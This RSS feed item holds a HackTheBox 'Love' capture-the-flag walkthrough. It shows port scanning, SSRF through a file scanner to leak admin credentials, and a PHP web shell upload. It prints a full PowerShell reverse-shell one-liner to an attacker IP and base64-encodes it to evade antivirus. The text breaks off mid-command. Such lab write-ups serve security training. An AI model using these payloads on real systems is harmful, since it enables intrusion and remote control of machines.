<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>msfvenom on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/msfvenom/</link>
    <description>Recent content in msfvenom on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Mon, 09 Aug 2021 05:38:45 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/msfvenom/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Love</title>
      <link>https://fahmifj.github.io/hackthebox/love/</link>
      <pubDate>Mon, 09 Aug 2021 05:38:45 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/love/</guid>
      <description>SSRF in beginner-level</description>
      <content:encoded><![CDATA[<p>Love from Hack The Box hosts a voting system application and an online file scanner. The file scanner is vulnerable to SSRF, which can be exploited to leak a set of credentials that can be used to login into the voting app. The photo upload functionality can be leveraged to drop a web shell, which is then used to gain interactive shell access on the machine. Enumeration of the system reveals that <code>AlwaysInstallElevated</code> is enabled, and this can be leveraged to install a malicious <code>.msi</code> installer and get SYSTEM access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>SSRF</li>
<li>Abusing Windows <strong>AlwaysInstallElevated</strong></li>
<li>(Alternative) PrintNightmare LPE</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Burp Suite</li>
<li>WinPEAS</li>
<li>msfvenom</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan scan discovers a bunch of open ports.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «love» «10.10.14.51» 
</span></span><span class="line"><span class="cl">$ fscan 10.10.10.239 love
</span></span><span class="line"><span class="cl">nmap -p- --min-rate<span class="o">=</span><span class="m">1000</span> 10.10.10.239 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
</span></span><span class="line"><span class="cl">nmap -p80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670 -sC -sV -oA nmap/10-tcp-allport-love 10.10.10.239
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-08 11:29 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.239
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.087s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE      VERSION
</span></span><span class="line"><span class="cl">80/tcp    open  http         Apache httpd 2.4.46 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.46 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Voting System using PHP
</span></span><span class="line"><span class="cl">135/tcp   open  msrpc        Microsoft Windows RPC
</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
</span></span><span class="line"><span class="cl">443/tcp   open  ssl/http     Apache httpd 2.4.46 <span class="o">(</span>OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.46 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>staging.love.htb/organizationName<span class="o">=</span>ValentineCorp/stateOrProvinceName<span class="o">=</span>m/countryName<span class="o">=</span>in
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-01-18T14:00:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2022-01-18T14:00:16
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-alpn: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds Windows <span class="m">10</span> Pro <span class="m">19042</span> microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
</span></span><span class="line"><span class="cl">3306/tcp  open  mysql?
</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, NULL, NotesRPC, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, WMSRequest, oracle-tns: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Host <span class="s1">&#39;10.10.14.51&#39;</span> is not allowed to connect to this MariaDB server
</span></span><span class="line"><span class="cl">5000/tcp  open  http         Apache httpd 2.4.46 <span class="o">(</span>OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.46 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: <span class="m">403</span> Forbidden
</span></span><span class="line"><span class="cl">5040/tcp  open  unknown
</span></span><span class="line"><span class="cl">5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
</span></span><span class="line"><span class="cl">5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>LOVE
</span></span><span class="line"><span class="cl"><span class="p">|</span> Subject Alternative Name: DNS:LOVE, DNS:Love
</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2021-04-11T14:39:19
</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2024-04-10T14:39:19
</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: 2021-08-08T15:53:52+00:00<span class="p">;</span> +21m37s from scanner time.
</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-alpn: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
</span></span><span class="line"><span class="cl">7680/tcp  open  pando-pub?
</span></span><span class="line"><span class="cl">47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Not Found
</span></span><span class="line"><span class="cl">49664/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49665/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49666/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49667/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49668/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49669/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class="line"><span class="cl">49670/tcp open  msrpc        Microsoft Windows RPC
</span></span><span class="line"><span class="cl"><span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class="line"><span class="cl">SF-Port3306-TCP:V<span class="o">=</span>7.91%I<span class="o">=</span>7%D<span class="o">=</span>8/8%Time<span class="o">=</span>610FF878%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>NUL
</span></span><span class="line"><span class="cl">SF:L,4A,<span class="s2">&#34;F\0\0\x01\xffj\x04Host\x20&#39;10\.10\.14\.51&#39;\x20is\x20not\x20allowe
</span></span></span><span class="line"><span class="cl"><span class="s2">...[SNIP]...
</span></span></span><span class="line"><span class="cl"><span class="s2">Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Host script results:
</span></span></span><span class="line"><span class="cl"><span class="s2">|_clock-skew: mean: 2h06m37s, deviation: 3h30m01s, median: 21m36s
</span></span></span><span class="line"><span class="cl"><span class="s2">| smb-os-discovery: 
</span></span></span><span class="line"><span class="cl"><span class="s2">|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
</span></span></span><span class="line"><span class="cl"><span class="s2">|   OS CPE: cpe:/o:microsoft:windows_10::-
</span></span></span><span class="line"><span class="cl"><span class="s2">|   Computer name: Love
</span></span></span><span class="line"><span class="cl"><span class="s2">|   NetBIOS computer name: LOVE\x00
</span></span></span><span class="line"><span class="cl"><span class="s2">|   Workgroup: WORKGROUP\x00
</span></span></span><span class="line"><span class="cl"><span class="s2">|_  System time: 2021-08-08T08:53:41-07:00
</span></span></span><span class="line"><span class="cl"><span class="s2">| smb-security-mode: 
</span></span></span><span class="line"><span class="cl"><span class="s2">|   account_used: &lt;blank&gt;
</span></span></span><span class="line"><span class="cl"><span class="s2">|   authentication_level: user
</span></span></span><span class="line"><span class="cl"><span class="s2">|   challenge_response: supported
</span></span></span><span class="line"><span class="cl"><span class="s2">|_  message_signing: disabled (dangerous, but default)
</span></span></span><span class="line"><span class="cl"><span class="s2">| smb2-security-mode: 
</span></span></span><span class="line"><span class="cl"><span class="s2">|   2.02: 
</span></span></span><span class="line"><span class="cl"><span class="s2">|_    Message signing enabled but not required
</span></span></span><span class="line"><span class="cl"><span class="s2">| smb2-time: 
</span></span></span><span class="line"><span class="cl"><span class="s2">|   date: 2021-08-08T15:53:43
</span></span></span><span class="line"><span class="cl"><span class="s2">|_  start_date: N/A
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class="line"><span class="cl"><span class="s2">Nmap done: 1 IP address (1 host up) scanned in 137.03 seconds
</span></span></span></code></pre></div><p>Most notable services are:</p>
<ul>
<li>An Apache web server that handles 3 websites on port 80, 443, and 5000 (this one is forbidden).</li>
<li>SMB on port 445, good start.</li>
<li>A MySQL server on port 3306, I will stay away from this for now because IP block</li>
<li>WinRM on 5985/6, I will use this for lateral movement if I have creds.</li>
</ul>
<p>Seeing Apache and MySQL on a Windows host, I can assume that this machine uses XAMPP.</p>
<p>Nmap also identified two hostnames: <code>www.love.htb</code> and <code>staging.love.htb</code>. I will add these to my <code>/etc/hosts</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «love» «10.10.14.51» 
</span></span><span class="line"><span class="cl">$ sudo <span class="nb">echo</span> <span class="s1">&#39;www.love.htb staging.love.htb&#39;</span> &gt;&gt; /etc/hosts
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>Anonymous login is not allowed here, I will re-visit this later when I have creds.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «love» «10.10.14.51» 
</span></span><span class="line"><span class="cl">$ smbclient -N -L //10.10.10.239 
</span></span><span class="line"><span class="cl">session setup failed: NT_STATUS_ACCESS_DENIED
</span></span></code></pre></div><h3 id="tcp-5000">TCP 5000</h3>
<p>Visiting this port results in a <strong>403 Forbidden</strong> message error.</p>
<p><div class="img-container"><img src="imgs/image-20210809005411183.png" alt="image-20210809005411183"  /></div>
</p>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting port 80 with the IP or the hostname returns the same content.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «love» «10.10.14.51» 
</span></span><span class="line"><span class="cl">$ <span class="k">for</span> i in 10.10.10.239 www.love.htb<span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> -n <span class="s2">&#34;</span><span class="nv">$i</span><span class="s2"> &#34;</span><span class="p">;</span> curl -s <span class="nv">$i</span> <span class="p">|</span> wc -c<span class="p">;</span> <span class="k">done</span>                      
</span></span><span class="line"><span class="cl">10.10.10.239 <span class="m">4388</span>
</span></span><span class="line"><span class="cl">www.love.htb <span class="m">4388</span>
</span></span></code></pre></div><p>On the browser, the site displays a login form of a Voting System app.</p>
<p><div class="img-container"><img src="imgs/image-20210809003519382.png" alt="image-20210809003519382"  /></div>
</p>
<p>Trying some random IDs and common passwords didn&rsquo;t work here.</p>
<p><div class="img-container"><img src="imgs/image-20210809004024045.png" alt="image-20210809004024045"  /></div>
</p>
<h4 id="gobuster">Gobuster</h4>
<p><code>Gobuster</code> discovers a bunch of directories, but one that stands out is  <code>/admin</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «love» «10.10.14.51» 
</span></span><span class="line"><span class="cl">$ gobuster dir -f -u http://www.love.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -x txt,php -o gobuster/gobuster-S-80 -t <span class="nv">40</span>                                                                                                                                                           
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">Gobuster v3.1.0
</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://www.love.htb/
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">40</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Extensions:              txt,php
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Add Slash:               <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2021/08/08 13:16:14 Starting gobuster in directory enumeration <span class="nv">mode</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">/cgi-bin/             <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>
</span></span><span class="line"><span class="cl">/admin/               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 6198<span class="o">]</span>
</span></span><span class="line"><span class="cl">/includes/            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2261<span class="o">]</span>
</span></span><span class="line"><span class="cl">/plugins/             <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2490<span class="o">]</span>
</span></span><span class="line"><span class="cl">/images/              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2719<span class="o">]</span>
</span></span><span class="line"><span class="cl">/logout.php           <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; index.php<span class="o">]</span>
</span></span><span class="line"><span class="cl">/login.php            <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; index.php<span class="o">]</span>
</span></span><span class="line"><span class="cl">/webalizer/           <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
</span></span><span class="line"><span class="cl">/home.php             <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; index.php<span class="o">]</span>
</span></span><span class="line"><span class="cl">/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 4388<span class="o">]</span>             
</span></span><span class="line"><span class="cl">/phpmyadmin/          <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
</span></span><span class="line"><span class="cl">/icons/               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 74798<span class="o">]</span>            
</span></span><span class="line"><span class="cl">/preview.php          <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0<span class="o">]</span> <span class="o">[</span>--&gt; index.php<span class="o">]</span>
</span></span><span class="line"><span class="cl">/examples/            <span class="o">(</span>Status: 503<span class="o">)</span> <span class="o">[</span>Size: 402<span class="o">]</span>              
</span></span><span class="line"><span class="cl">/dist/                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1389<span class="o">]</span>             
</span></span><span class="line"><span class="cl">/tcpdf/               <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2710<span class="o">]</span>             
</span></span><span class="line"><span class="cl">/licenses/            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 421<span class="o">]</span>              
</span></span><span class="line"><span class="cl">/server-status/       <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 421<span class="o">]</span>              
</span></span><span class="line"><span class="cl">/con.php              <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
</span></span><span class="line"><span class="cl">/con/                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
</span></span><span class="line"><span class="cl">/con.txt              <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
</span></span><span class="line"><span class="cl">/aux/                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
</span></span><span class="line"><span class="cl">/aux.php              <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
</span></span><span class="line"><span class="cl">/aux.txt              <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 302<span class="o">]</span>              
</span></span><span class="line"><span class="cl">                                                             
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2021/08/08 13:18:01 <span class="nv">Finished</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span></code></pre></div><h4 id="admin">/admin</h4>
<p>When I visit <code>/admin</code>, the page presents the same login form. But this time, instead of voter&rsquo;s ID, it uses username.</p>
<p><div class="img-container"><img src="imgs/image-20210809003454272.png" alt="image-20210809003454272"  /></div>
</p>
<p>Submitting several credentials only reveals that <code>admin</code> is a valid username here.</p>
<h3 id="tcp-80---staginglovehtb">TCP 80 - staging.love.htb</h3>
<p>On <code>staging.love.htb</code>, the site provides an online file scanner.</p>
<p><div class="img-container"><img src="imgs/image-20210809010051350.png" alt="image-20210809010051350"  /></div>
</p>
<p>The &ldquo;Demo&rdquo; menu points to <code>/beta.php</code>, and it allows visitor to insert a URL there.</p>
<p><div class="img-container"><img src="imgs/image-20210809010747052.png" alt="image-20210809010747052"  /></div>
</p>
<p>While having my netcat listener in listening mode, I entered my HTB IP there, and my listener received the following request.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «love» «10.10.14.51» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">80</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">80</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.51<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.239<span class="o">]</span> <span class="m">49806</span>
</span></span><span class="line"><span class="cl">GET /iamf HTTP/1.1
</span></span><span class="line"><span class="cl">Host: 10.10.14.51
</span></span><span class="line"><span class="cl">Accept: */*
</span></span></code></pre></div><p>Based on the received request, I&rsquo;m guessing the request was crafted using PHP curl. If the user agent contains &ldquo;WindowsPowerShell&rdquo;, I&rsquo;m going to use Responder to see if I can steal the NTLMv2 response.</p>
<p>Playing a bit with it reveals that it can render HTML.</p>
<p><div class="img-container"><img src="imgs/image-20210809014613874.png" alt="image-20210809014613874"  /></div>
</p>
<p>The key take away from here is that <code>staging.love.htb/beta.php</code> <strong>can make a HTTP request.</strong></p>
<h3 id="tcp-443---website">TCP 443 - Website</h3>
<p>On HTTPS, the SSL certificate leaks an email address and a potential username: <code>roy@love.htb</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210809005318725.png" alt="image-20210809005318725"  /></div>
</p>
<p>And both the HTTPS versions of <code>www.love.htb</code> and <code>staging.love.htb</code> return the Forbidden message error.</p>
<p><div class="img-container"><img src="imgs/image-20210809012934262.png" alt="image-20210809012934262"  /></div>
</p>
<p><div class="img-container"><img src="imgs/image-20210809012945191.png" alt="image-20210809012945191"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-phoebe">Shell as phoebe</h3>
<h4 id="ssrf">SSRF</h4>
<p>The behavior of the file scanner on <code>staging.love.htb</code> making a HTTP (not always) request can be abused to access internal resources that previously were inaccessible due to IP restrictions. This attack is often referred as Server-Side Request Forgery (SSRF).</p>
<p>When I submit <code>file:///C:/xampp/apache/conf/extra/httpd-vhosts.conf</code>, it returns the virtual host configuration file.</p>
<p><div class="img-container"><img src="imgs/image-20210809033303050.png" alt="image-20210809033303050"  /></div>
</p>
<p>The string &ldquo;C:/xampp/htdocs/passwordmanager&rdquo; immediately draws my attention. Based on that config, the service on port 5000 is a password manager, and the access is limited to only allow connections from <code>127.0.0.1</code>.</p>
<p>Assuming there is an index file, I try to submit  <code>file:///C:/xampp/htdocs/passwordmanager/index.php</code> , and the file is exist.</p>
<p><div class="img-container"><img src="imgs/image-20210809034759102.png" alt="image-20210809034759102"  /></div>
</p>
<p>Now if I submit <code>file:///C:/xampp/htdocs/passwordmanager/creds.txt</code>, it returns the following:</p>
<p><div class="img-container"><img src="imgs/image-20210809034943436.png" alt="image-20210809034943436"  /></div>
</p>
<p>Alternatively, I can just visit <code>http://127.0.0.1:5000/</code> and the file scanner will render the page of password manager, in which contains the admin credentials.</p>
<p><div class="img-container"><img src="imgs/image-20210809033828889.png" alt="image-20210809033828889"  /></div>
</p>
<p>I can use that creds to access the admin dashboard.</p>
<p><div class="img-container"><img src="imgs/image-20210809034300363.png" alt="image-20210809034300363"  /></div>
</p>
<h4 id="php-webshell">PHP webshell</h4>
<p>On  <code>admin/voters.php</code>, there is a photo upload feature.</p>
<p><div class="img-container"><img src="imgs/image-20210809035502402.png" alt="image-20210809035502402"  /></div>
</p>
<p>I will intercept the request to modify the photo section to a PHP web shell and then send it afterwards. It gets uploaded smoothly.</p>
<p><div class="img-container"><img src="imgs/image-20210809040225250.png" alt="image-20210809040225250"  /></div>
</p>
<p>When I reload the page, I see the voter I added is there with broken photo, and that because it loads my PHP web shell as image.</p>
<p><div class="img-container"><img src="imgs/image-20210809041027772.png" alt="image-20210809041027772"  /></div>
</p>
<p>The uploaded web shell is accessible at  <code>http://www.love.htb/images/shell.php</code>, and now I have code execution as <strong>phoebe</strong>.</p>
<p><div class="img-container"><img src="imgs/image-20210809040810276.png" alt="image-20210809040810276"  /></div>
</p>
<h4 id="interactive-shell-access">Interactive shell access</h4>
<p>To get an interactive shell I will use a PowerShell one-liner reverse shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «love» «10.10.14.51» 
</span></span><span class="line"><span class="cl">$ cat exploits/revshell.ps1
</span></span><span class="line"><span class="cl"><span class="nv">$client</span> <span class="o">=</span> New-Object System.Net.Sockets.TCPClient<span class="o">(</span><span class="s1">&#39;10.10.14.51&#39;</span>,53<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span> <span class="o">=</span> <span class="nv">$client</span>.GetStream<span class="o">()</span><span class="p">;</span><span class="o">[</span>byte<span class="o">[]]</span><span class="nv">$bytes</span> <span class="o">=</span> 0..65535<span class="p">|</span>%<span class="o">{</span>0<span class="o">}</span><span class="p">;</span><span class="k">while</span><span class="o">((</span><span class="nv">$i</span> <span class="o">=</span> <span class="nv">$stream</span>.Read<span class="o">(</span><span class="nv">$bytes</span>, 0, <span class="nv">$bytes</span>.Length<span class="o">))</span> -ne 0<span class="o">){</span><span class="p">;</span><span class="nv">$data</span> <span class="o">=</span> <span class="o">(</span>New-Object -TypeName System.Text.ASCIIEncoding<span class="o">)</span>.GetString<span class="o">(</span><span class="nv">$bytes</span>,0, <span class="nv">$i</span><span class="o">)</span><span class="p">;</span><span class="nv">$sendback</span> <span class="o">=</span> <span class="o">(</span>iex <span class="nv">$data</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> Out-String <span class="o">)</span><span class="p">;</span><span class="nv">$sendback2</span> <span class="o">=</span> <span class="nv">$sendback</span> + <span class="s1">&#39;PS &#39;</span> + <span class="o">(</span><span class="nb">pwd</span><span class="o">)</span>.Path + <span class="s1">&#39;&gt; &#39;</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="o">=</span> <span class="o">([</span>text.encoding<span class="o">]</span>::ASCII<span class="o">)</span>.GetBytes<span class="o">(</span><span class="nv">$sendback2</span><span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Write<span class="o">(</span><span class="nv">$sendbyte</span>,0,<span class="nv">$sendbyte</span>.Length<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Flush<span class="o">()}</span><span class="p">;</span><span class="nv">$client</span>.Close<span class="o">()</span>
</span></span></code></pre></div><p>Because it is a Windows machine, I will encoded it with base64 to avoid AV.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «love» «10.10.14.51» 
</span></span><span class="line"><span class="cl">$ cat exploits/revshell.ps1<span class="p">|</span> iconv -t UTF-16LE<span class="p">|</span> base64 -w0
</span></span><span class="line"><span class="cl"><span 